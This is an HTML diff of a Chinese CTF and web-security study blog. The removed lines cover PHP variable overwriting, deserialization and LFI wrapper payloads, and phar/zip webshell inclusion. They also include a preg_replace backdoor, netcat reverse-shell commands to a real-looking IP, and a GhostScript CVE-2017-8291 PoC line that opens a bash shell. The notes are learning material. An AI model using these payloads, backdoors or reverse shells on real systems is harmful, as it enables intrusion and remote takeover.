</div><div class="line">		&#125;</div><div class="line">	<span class="keyword">else</span>&#123;       </div><div class="line">		<span class="keyword">echo</span><span class="string">'flag被加密了 再加密一次就得到flag了'</span>;</div><div class="line">		&#125;   </div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p>parse_str() 的作用是解析字符串，并注册成变量。与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//var.php?var=new  </span></div><div class="line">$var=<span class="string">'init'</span>;  </div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</div><div class="line"><span class="comment">// $var 会变成 new</span></div><div class="line"><span class="keyword">echo</span> $var;</div></pre></td></tr></table></figure></p>
-<h2 id="import-request-variables-变量覆盖"><a href="#import-request-variables-变量覆盖" class="headerlink" title="import_request_variables()变量覆盖"></a><code>import_request_variables()</code>变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.php?a=1  返回 true!</span></div><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$a = <span class="string">'0'</span>;  </div><div class="line">import_request_variables(<span class="string">'G'</span>);  </div><div class="line"></div><div class="line"><span class="keyword">if</span>($a == <span class="number">1</span>)&#123;  </div><div class="line">  <span class="keyword">echo</span> <span class="string">"true!"</span>;  </div><div class="line">&#125;<span class="keyword">else</span>&#123;  </div><div class="line">  <span class="keyword">echo</span> <span class="string">"false!"</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p><code>import_request_variables()</code>，将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</p>
-<h2 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$ 变量覆盖"></a>$$ 变量覆盖</h2><p>如果把变量本身的 key 也当变量，也就是使用了 <code>$$</code>，就可能存在问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$_ = <span class="string">'_POST'</span>;</div><div class="line"><span class="comment">// $$_ 是等于 $_POST</span></div><div class="line">例一:</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$id=<span class="number">1</span>;</div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $request) &#123;    </div><div class="line">          <span class="keyword">foreach</span> ($$request <span class="keyword">as</span> $key =&gt; $value) &#123;        </div><div class="line">                    <span class="keyword">echo</span> $key.<span class="string">"   "</span>.$value.<span class="string">"&lt;/br&gt;"</span>;        </div><div class="line">                    $&#123;$key&#125;=$value;        <span class="comment">//echo $$key;    </span></div><div class="line">                  &#125;</div><div class="line">          &#125;</div><div class="line"><span class="keyword">echo</span> $id;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">例二:</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $a=<span class="string">'hello'</span>;</div><div class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value&#123;</div><div class="line">        $$key = $value;</div><div class="line">    &#125;</div><div class="line"> <span class="keyword">print</span> $a;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这里会先把<code>$key</code>输出来，让你明确是如何覆盖和覆盖了什么，像当前文件提交<code>index.php?id=xxxx</code>,就可以覆盖掉$id的值。</p>
-<h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p><code>unset($bar);</code> 用来销毁指定的变量，如果变量 $bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// http://127.0.0.1/index.php?_CONFIG=123</span></div><div class="line">$_CONFIG[<span class="string">'extraSecure'</span>] = <span class="keyword">true</span>;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $method) &#123;</div><div class="line">    <span class="keyword">foreach</span>($$method <span class="keyword">as</span> $key=&gt;$value) &#123;</div><div class="line">      <span class="comment">// $key == _CONFIG</span></div><div class="line">      <span class="comment">// $$key == $_CONFIG</span></div><div class="line">      <span class="comment">// 这个函数会把 $_CONFIG 变量销毁</span></div><div class="line">      <span class="keyword">unset</span>($$key);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_CONFIG[<span class="string">'extraSecure'</span>] == <span class="keyword">false</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'flag &#123;****&#125;'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="特殊的-PHP-代码格式"><a href="#特殊的-PHP-代码格式" class="headerlink" title="特殊的 PHP 代码格式"></a>特殊的 PHP 代码格式</h1><ul>
-<li>.php2</li>
-<li>.php3</li>
-<li>.php4</li>
-<li>.php5</li>
-<li>.php7</li>
-<li>.phtml<br>正则检测文件内容中包含 <code>&lt;?</code> 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"php"</span>&gt;</div><div class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">'flag.php'</span>));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>效果等于 echo ‘a’;<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=<span class="string">'a'</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>如果在 php.ini 文件中配置允许 ASP 风格的标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Allow ASP-style &lt;% %&gt; tags.</div><div class="line">; http:<span class="comment">//php.net/asp-tags</span></div><div class="line">asp_tags = On</div></pre></td></tr></table></figure></p>
-<p>则可以使用该方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;% <span class="keyword">echo</span> <span class="string">'a'</span>; %&gt;</div></pre></td></tr></table></figure></p>
-<h1 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h1><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h2><p>mt_rand() 函数是一个伪随机发生器，即如果知道随机数种子是可以预测的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$seed = <span class="number">12345</span>;</div><div class="line">mt_rand($seed);</div><div class="line"></div><div class="line">$ss = mt_rand();</div></pre></td></tr></table></figure></p>
-<p>linux 64 位系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647，正好是 2^31-1，也就是说随机播种的种子也是在这个范围中的，0 – 2147483647 的这个范围是可以爆破的。<br>但是用 php 爆破比较慢，有一个 C 的版本，可以根据随机数，爆破出种子 <a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="external">php_mt_seed</a>。</p>
-<p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>
-<h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand() 函数在产生随机数的时候没有调用 srand()，则产生的随机数是有规律可询的。具体的说明请看<a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">这里</a>。产生的随机数可以用下面这个公式预测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//一般预测值可能比实际值要差1</div><div class="line">state[i] = state[i-3] + state[i-31]</div></pre></td></tr></table></figure></p>
-<p>可以用下面的代码验证一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$randStr = <span class="keyword">array</span>();</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50</span>;$i++) &#123;  <span class="comment">//先产生 32个随机数</span></div><div class="line">    $randStr[$i]=rand(<span class="number">0</span>,<span class="number">30</span>);</div><div class="line">    <span class="keyword">if</span>($i&gt;=<span class="number">31</span>) &#123;</div><div class="line">        <span class="keyword">echo</span>  <span class="string">"$randStr[$i]=("</span>.$randStr[$i<span class="number">-31</span>].<span class="string">"+"</span>.$randStr[$i<span class="number">-3</span>].<span class="string">") mod 31"</span>.<span class="string">"\n"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ul>
-<li><code>_construct()</code>：构造函数，当对象创建(new)时会自动调用。但在<code>unserialize()</code>时是不会自动调用的。</li>
-<li><code>__destruct()</code>：析构函数，当对象被销毁时会自动调用。</li>
-<li><code>__wakeup()</code>：如前所提，<code>unserialize()</code>时会自动调用。<br>PHP <code>unserialize()</code> 后会导致 <code>__wakeup()</code> 或 <code>__destruct()</code> 的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在 <code>__wakeup()</code>或 <code>__destruct()</code> 中。<h1 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup 函数绕过"></a><code>__wakeup</code> 函数绕过</h1>PHP 有个 <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">Bug</a>，如果反序列化出现问题，会不去执行 <code>__wakeup</code> 函数，例如：<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $flag = <span class="string">"111"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//echo serialize(new xctf());</span></div><div class="line"><span class="keyword">echo</span> unserialize($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;****&#125;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>使用这个 payload 绕过 <code>__wakeup</code> 函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</div><div class="line">http://www.example.com/index.php?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</div></pre></td></tr></table></figure></p>
-<p>在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2就会产生报错，导致不会去执行 <code>__wakeup</code> 函数，从而绕过该函数。</p>
-<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://10.2.1.1:20770/index.php?page=upload</div><div class="line">这种 url 很容易就能想到可能是文件包含或者伪协议读取</div><div class="line">http://10.2.1.1:20770/index.php?page=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号`"></a>反引号`</h2><p>反引号 ` 可以调用 shell_exec 正常执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`$_GET[&apos;v&apos;]` 相当于 shell_exec($_GET[&apos;v&apos;])</div></pre></td></tr></table></figure></p>
-<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>触发条件：</p>
-<ul>
-<li>第一个参数需要e标识符，有了它可以执行第二个参数的命令</li>
-<li>第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 这样是可以执行命令的</span></div><div class="line"><span class="keyword">echo</span> preg_replace(<span class="string">'/test/e'</span>, <span class="string">'phpinfo()'</span>, <span class="string">'just test'</span>);</div><div class="line"></div><div class="line"><span class="comment">// 这种没有匹配上，所以返回值是第三个参数，不会执行命令</span></div><div class="line"><span class="keyword">echo</span> preg_replace(<span class="string">'/test/e'</span>, <span class="string">'phpinfo()'</span>, <span class="string">'just tesxt'</span>);</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>我们可以构造这样的后门代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@preg_replace(<span class="string">"//e"</span>, $_GET[<span class="string">'h'</span>], <span class="string">"Access Denied"</span>);  </div><div class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"h"</span>], <span class="string">"jutst test"</span>);</div></pre></td></tr></table></figure></p>
-<p>当访问这样这样的链接时就可以被触发<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8000/testbug.php?h=phpinfo();</div></pre></td></tr></table></figure></p>
-<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/lfi.php?file=php://filter/convert.base64-encode/resource=flag.php</div><div class="line">/lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php</div></pre></td></tr></table></figure></p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>写入文件， 数据利用 POST 传过去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/test.php?file=php://input</div></pre></td></tr></table></figure></p>
-<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>将 include 的文件流重定向到用户控制的输入流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==</div><div class="line">//base64部分为:&lt;?php phpinfo();exit();//</div></pre></td></tr></table></figure></p>
-<p>可以用于控制 file_get_contents 的内容为用户输入的流<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$file=$_GET[<span class="string">'file'</span>];</div><div class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</div><div class="line"><span class="keyword">echo</span> $data;</div></pre></td></tr></table></figure></p>
-<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。</p>
-<p>写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含<br>这里的路径为上传的 jpg 文件在服务器的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?id=phar://路径/xxx.jpg/shell</div></pre></td></tr></table></figure></p>
-<h2 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h2><p>上述 phar:// 的方法也可以使用 zip://</p>
-<p>然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。</p>
-<p>1.zip文件内仅有1.php这个文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/php?file=zip:<span class="comment">//1.png%231.php  </span></div><div class="line"><span class="comment">// 也可以尝试不改名为png，直接使用zip上传测试一下</span></div><div class="line">/php?file=zip:<span class="comment">//1.zip%231.php</span></div></pre></td></tr></table></figure></p>
-<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>正常的文件上传流程是这样的，首先接收 <code>POST</code> 的文件，在 <code>tmp</code> 目录下生成临时文件，文件名是 <code>php[A-Za-z0-9]{6}</code>，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 <code>/tmp</code> 目录下可以留下任何内容。 内容构造好后，单纯爆破 <code>/tmp/phpxxxxxx</code> 文件名是不太现实但是也可行的。</p>
-<p>通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/06/daily_1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Rainer">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Rainer">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/06/daily_1/" itemprop="url">2017-11-3</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-06T22:59:37+08:00">
-                2017-11-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="nc学习"><a href="#nc学习" class="headerlink" title="nc学习"></a>nc学习</h1><ul>
-<li>自己vps上的监听命令:  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443</div><div class="line">-l指定监听模式,  </div><div class="line">-p xxx指定监听的端口,上面以443为例</div></pre></td></tr></table></figure>
-<ul>
-<li>后门playload  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;</div><div class="line">nc -nv 138.197.214.134 443 -c bash</div></pre></td></tr></table></figure>
-<p>执行上述后,在<em>监听方</em>就可以执行任意命令</p>
-<ul>
-<li>反向执行<br>监听方:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lp 443 -c bash</div></pre></td></tr></table></figure>
-<p>连接方:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nv 138.197.214.134 443</div></pre></td></tr></table></figure>
-<p><em>连接方</em>就可执行任意命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">nc -l -p 443 &gt; 1.txt</div><div class="line">nc -nv 10.1.1.12 443 -q 1 #将接受到的内容写入文件</div><div class="line"></div><div class="line"><span class="meta">#</span>命令执行结果传输</div><div class="line">ls -l|nc -nv 10.1.1.12 443 #执行命令的同时将结果发送到nc连接</div><div class="line"></div><div class="line"><span class="meta">#</span>文件传输</div><div class="line">nc -lp 443 &gt; 2.mp4   #接受媒体</div><div class="line">nc -nv 10.1.1.12 443 &lt; a.mp4 -q 1  #发送媒体</div><div class="line"></div><div class="line"><span class="meta">#</span>端口扫描</div><div class="line">nc -nvz 10.1.1.11 1-65535  #TCP端口扫描</div><div class="line">nc -nvzu 10.1.1.11 1-65535   #UDP端口扫描</div></pre></td></tr></table></figure>
-<h2 id="Exploiting-Python-PIL-Module-Command-Execution-Vulnerability"><a href="#Exploiting-Python-PIL-Module-Command-Execution-Vulnerability" class="headerlink" title="Exploiting Python PIL Module Command Execution Vulnerability"></a>Exploiting Python PIL Module Command Execution Vulnerability</h2><p><a href="https://paper.seebug.org/405/" target="_blank" rel="external">https://paper.seebug.org/405/</a><br>PIL (Python Image Library) 应该是 Python 图片处理库中运用最广泛的，它拥有强大的功能和简洁的API。很多Python Web应用在需要实现处理图片的功能时，都会选择使用PIL。</p>
-<p>PIL在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在dSAFER模式下处理图片，即使是最新版本的PIL模块，也会受到 GhostButt CVE-2017-8291 dSAFER模式Bypass漏洞的影响，产生命令执行漏洞。</p>
-<ul>
-<li>poc使用说明:</li>
-<li>获取图像长宽高时<br>poc文件为.eps格式,但是可以更改<em>后缀名</em>,因为识别文件依赖于文件头<br>更改第89行:  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">16#</span>3f0 0 put</div><div class="line"></div><div class="line">currentdevice null false mark /OutputFile (%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</div><div class="line">.putdeviceparams</div><div class="line">1 true .outputpage</div></pre></td></tr></table></figure>
-<p><code>(%pipe%nc -e /bin/bash &lt;ip&gt; &lt;port&gt;)</code> 处就可以更换playload<br>此处为使用nc连接</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/11/06/2017_11_14/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1349,7 +1445,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1360,7 +1456,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
